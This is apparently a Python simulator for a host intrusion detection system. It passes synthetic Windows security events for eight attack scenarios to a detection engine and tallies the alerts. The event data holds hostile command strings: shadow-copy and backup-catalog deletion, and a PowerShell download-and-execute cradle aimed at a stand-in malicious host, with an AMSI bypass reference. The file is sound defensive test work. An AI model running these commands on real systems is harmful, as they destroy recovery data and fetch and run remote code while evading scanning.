"""
HIDS Synthetic Security Event Simulator.

A completely SAFE, synthetic test harness that simulates realistic Windows security attack
telemetry through normalized event payloads to validate detection rules, multi-event correlation,
severity rating, and structured SIEM logging WITHOUT modifying the host OS or executing any real attacks.
"""

from datetime import datetime, timezone, timedelta
import json
from pathlib import Path
import sys

# Add project root to sys.path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from hids.hids import HIDSEngine
from hids.severity import Severity
from logger import get_logger, LOG_FILE


def run_simulation():
    print("=" * 75)
    print("      HIDS SYNTHETIC SECURITY EVENT SIMULATOR (SAFE TEST HARNESS)")
    print("=" * 75)
    print("Target: Validating HIDS Detection, Normalization, Rules, and Correlation\n")

    logger = get_logger()
    engine = HIDSEngine(logger=logger)

    total_events_injected = 0
    total_rule_alerts = 0
    total_corr_alerts = 0

    base_time = datetime.now(timezone.utc)

    # -------------------------------------------------------------------------
    # Scenario 1: Brute Force Password Spray followed by Successful Compromise
    # -------------------------------------------------------------------------
    print("[1/8] Simulating Brute-Force Attack Scenario (T1110 -> T1078)...")
    for i in range(4):
        event = {
            "Id": 4625,
            "Channel": "Security",
            "ProviderName": "Microsoft-Windows-Security-Auditing",
            "Computer": "DC01.corp.internal",
            "TimeCreated": (base_time + timedelta(seconds=i * 5)).isoformat(),
            "record_id": 10000 + i,
            "event_data": {
                "TargetUserName": "admin_svc",
                "TargetDomainName": "CORP",
                "Status": "0xC000006D",
                "SubStatus": "0xC000006A",
                "IpAddress": "10.10.50.123",
                "LogonType": "3",
            }
        }
        total_events_injected += 1
        _, matches, corrs = engine.process_raw_event(event)
        total_rule_alerts += len(matches)
        total_corr_alerts += len(corrs)

    # Injected successful login for the same target user
    succ_event = {
        "Id": 4624,
        "Channel": "Security",
        "ProviderName": "Microsoft-Windows-Security-Auditing",
        "Computer": "DC01.corp.internal",
        "TimeCreated": (base_time + timedelta(seconds=25)).isoformat(),
        "record_id": 10005,
        "event_data": {
            "TargetUserName": "admin_svc",
            "TargetDomainName": "CORP",
            "IpAddress": "10.10.50.123",
            "LogonType": "3",
        }
    }
    total_events_injected += 1
    _, matches, corrs = engine.process_raw_event(succ_event)
    total_rule_alerts += len(matches)
    total_corr_alerts += len(corrs)
    print(f"  -> Generated {len(corrs)} Critical Correlation Alert(s)")

    # -------------------------------------------------------------------------
    # Scenario 2: Privilege Escalation & Backdoor User Account Creation
    # -------------------------------------------------------------------------
    print("\n[2/8] Simulating Privilege Escalation & Local Admin Modification (T1078 / T1098 / T1136)...")
    priv_events = [
        # Assign special privileges
        {
            "Id": 4672,
            "Channel": "Security",
            "ProviderName": "Microsoft-Windows-Security-Auditing",
            "Computer": "WS01.corp.internal",
            "TimeCreated": (base_time + timedelta(seconds=30)).isoformat(),
            "record_id": 10010,
            "event_data": {
                "SubjectUserName": "compromised_user",
                "PrivilegeList": "SeDebugPrivilege\r\nSeTcbPrivilege\r\nSeBackupPrivilege",
            }
        },
        # Create new local user
        {
            "Id": 4720,
            "Channel": "Security",
            "ProviderName": "Microsoft-Windows-Security-Auditing",
            "Computer": "WS01.corp.internal",
            "TimeCreated": (base_time + timedelta(seconds=35)).isoformat(),
            "record_id": 10011,
            "event_data": {
                "TargetUserName": "shadow_admin",
                "SubjectUserName": "compromised_user",
            }
        },
        # Add to Administrators group
        {
            "Id": 4728,
            "Channel": "Security",
            "ProviderName": "Microsoft-Windows-Security-Auditing",
            "Computer": "WS01.corp.internal",
            "TimeCreated": (base_time + timedelta(seconds=40)).isoformat(),
            "record_id": 10012,
            "event_data": {
                "MemberName": "shadow_admin",
                "TargetUserName": "Administrators",
            }
        },
    ]
    for ev in priv_events:
        total_events_injected += 1
        _, m, c = engine.process_raw_event(ev)
        total_rule_alerts += len(m)
        total_corr_alerts += len(c)
    print(f"  -> Generated {len(priv_events)} Privilege Escalation Alert(s)")

    # -------------------------------------------------------------------------
    # Scenario 3: Ransomware Behavior (Shadow Copy & Backup Deletion)
    # -------------------------------------------------------------------------
    print("\n[3/8] Simulating Ransomware Inhibit System Recovery (T1490)...")
    proc_events = [
        {
            "Id": 4688,
            "Channel": "Security",
            "ProviderName": "Microsoft-Windows-Security-Auditing",
            "Computer": "WS01.corp.internal",
            "TimeCreated": (base_time + timedelta(seconds=45)).isoformat(),
            "record_id": 10020,
            "event_data": {
                "SubjectUserName": "shadow_admin",
                "NewProcessName": "C:\\Windows\\System32\\vssadmin.exe",
                "CommandLine": "vssadmin.exe delete shadows /all /quiet",
            }
        },
        {
            "Id": 4688,
            "Channel": "Security",
            "ProviderName": "Microsoft-Windows-Security-Auditing",
            "Computer": "WS01.corp.internal",
            "TimeCreated": (base_time + timedelta(seconds=50)).isoformat(),
            "record_id": 10021,
            "event_data": {
                "SubjectUserName": "shadow_admin",
                "NewProcessName": "C:\\Windows\\System32\\wbadmin.exe",
                "CommandLine": "wbadmin.exe delete catalog -quiet",
            }
        }
    ]
    for ev in proc_events:
        total_events_injected += 1
        _, m, c = engine.process_raw_event(ev)
        total_rule_alerts += len(m)
        total_corr_alerts += len(c)
    print(f"  -> Generated {len(proc_events)} High Severity Process Alert(s)")

    # -------------------------------------------------------------------------
    # Scenario 4: Malicious Persistence Service Installation & Execution
    # -------------------------------------------------------------------------
    print("\n[4/8] Simulating Persistence Service Installation & Execution (T1543.003 -> CORR-002)...")
    svc_install = {
        "Id": 7045,
        "Channel": "System",
        "ProviderName": "Service Control Manager",
        "Computer": "WS01.corp.internal",
        "TimeCreated": (base_time + timedelta(seconds=55)).isoformat(),
        "record_id": 10030,
        "event_data": {
            "ServiceName": "WindowsUpdateAssistant",
            "ImagePath": "C:\\Users\\Public\\updater.exe",
            "AccountName": "LocalSystem",
        }
    }
    total_events_injected += 1
    _, m, c = engine.process_raw_event(svc_install)
    total_rule_alerts += len(m)
    total_corr_alerts += len(c)

    svc_exec = {
        "Id": 4688,
        "Channel": "Security",
        "ProviderName": "Microsoft-Windows-Security-Auditing",
        "Computer": "WS01.corp.internal",
        "TimeCreated": (base_time + timedelta(seconds=60)).isoformat(),
        "record_id": 10031,
        "event_data": {
            "SubjectUserName": "SYSTEM",
            "NewProcessName": "C:\\Users\\Public\\updater.exe",
            "CommandLine": "C:\\Users\\Public\\updater.exe -powershell -enc JABhAD0AIgBo...",
        }
    }
    total_events_injected += 1
    _, m, c = engine.process_raw_event(svc_exec)
    total_rule_alerts += len(m)
    total_corr_alerts += len(c)
    print("  -> Generated Service Alert + Correlated Service Execution Alert")

    # -------------------------------------------------------------------------
    # Scenario 5: Windows Defender Active Malware & Defense Tampering
    # -------------------------------------------------------------------------
    print("\n[5/8] Simulating Windows Defender Malware Detections (T1204 / T1562.001)...")
    defender_events = [
        {
            "Id": 1116,
            "Channel": "Microsoft-Windows-Windows Defender/Operational",
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "Computer": "WS01.corp.internal",
            "TimeCreated": (base_time + timedelta(seconds=65)).isoformat(),
            "record_id": 10040,
            "event_data": {
                "Threat Name": "Trojan:Win32/CobaltStrike.Beacon",
                "Path": "C:\\Users\\Public\\updater.exe",
            }
        },
        {
            "Id": 5001,
            "Channel": "Microsoft-Windows-Windows Defender/Operational",
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "Computer": "WS01.corp.internal",
            "TimeCreated": (base_time + timedelta(seconds=70)).isoformat(),
            "record_id": 10041,
        }
    ]
    for ev in defender_events:
        total_events_injected += 1
        _, m, c = engine.process_raw_event(ev)
        total_rule_alerts += len(m)
        total_corr_alerts += len(c)
    print(f"  -> Generated {len(defender_events)} Critical Malware / Defense Tampering Alert(s)")

    # -------------------------------------------------------------------------
    # Scenario 6: Malicious PowerShell Download Cradle & AMSI Bypass
    # -------------------------------------------------------------------------
    print("\n[6/8] Simulating Obfuscated PowerShell Activity (T1059.001 -> CORR-003)...")
    for i in range(4):
        ps_ev = {
            "Id": 4104,
            "Channel": "Microsoft-Windows-PowerShell/Operational",
            "ProviderName": "Microsoft-Windows-PowerShell",
            "Computer": "WS01.corp.internal",
            "TimeCreated": (base_time + timedelta(seconds=75 + i * 2)).isoformat(),
            "record_id": 10050 + i,
            "event_data": {
                "SubjectUserName": "shadow_admin",
                "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('https://cdn.malicious.xyz/stage2.ps1'); [Ref].Assembly::GetType('amsiInitFailed')",
            }
        }
        total_events_injected += 1
        _, m, c = engine.process_raw_event(ps_ev)
        total_rule_alerts += len(m)
        total_corr_alerts += len(c)
    print("  -> Generated PowerShell Threat Alert(s) + PowerShell Burst Correlation Alert")

    # -------------------------------------------------------------------------
    # Scenario 7: Indicator Removal (Audit Log Cleared)
    # -------------------------------------------------------------------------
    print("\n[7/8] Simulating Windows Event Log Clearing (T1070.001)...")
    log_clear = {
        "Id": 1102,
        "Channel": "Security",
        "ProviderName": "Microsoft-Windows-Security-Auditing",
        "Computer": "WS01.corp.internal",
        "TimeCreated": (base_time + timedelta(seconds=90)).isoformat(),
        "record_id": 10060,
        "event_data": {
            "SubjectUserName": "shadow_admin",
        }
    }
    total_events_injected += 1
    _, m, c = engine.process_raw_event(log_clear)
    total_rule_alerts += len(m)
    total_corr_alerts += len(c)
    print("  -> Generated Critical Audit Log Tampering Alert")

    # -------------------------------------------------------------------------
    # Scenario 8: Denial of Service / Critical Service Crash Storm
    # -------------------------------------------------------------------------
    print("\n[8/8] Simulating Service Crash Storm (T1489 -> CORR-004)...")
    for i, svc in enumerate(["TermService", "LanmanServer", "SamSs"]):
        crash_ev = {
            "Id": 7034,
            "Channel": "System",
            "ProviderName": "Service Control Manager",
            "Computer": "WS01.corp.internal",
            "TimeCreated": (base_time + timedelta(seconds=95 + i * 5)).isoformat(),
            "record_id": 10070 + i,
            "event_data": {
                "ServiceName": svc,
            }
        }
        total_events_injected += 1
        _, m, c = engine.process_raw_event(crash_ev)
        total_rule_alerts += len(m)
        total_corr_alerts += len(c)
    print("  -> Generated Service Crash Storm Correlation Alert")

    # -------------------------------------------------------------------------
    # Summary Report
    # -------------------------------------------------------------------------
    print("\n" + "=" * 75)
    print("                       SIMULATION COMPLETE")
    print("=" * 75)
    print(f"Total Synthetic Events Injected : {total_events_injected}")
    print(f"Total Rule Security Alerts     : {total_rule_alerts}")
    print(f"Total Correlated Alerts        : {total_corr_alerts}")
    print(f"Log Destination                : {LOG_FILE.resolve()}")
    print("=" * 75)


if __name__ == "__main__":
    run_simulation()
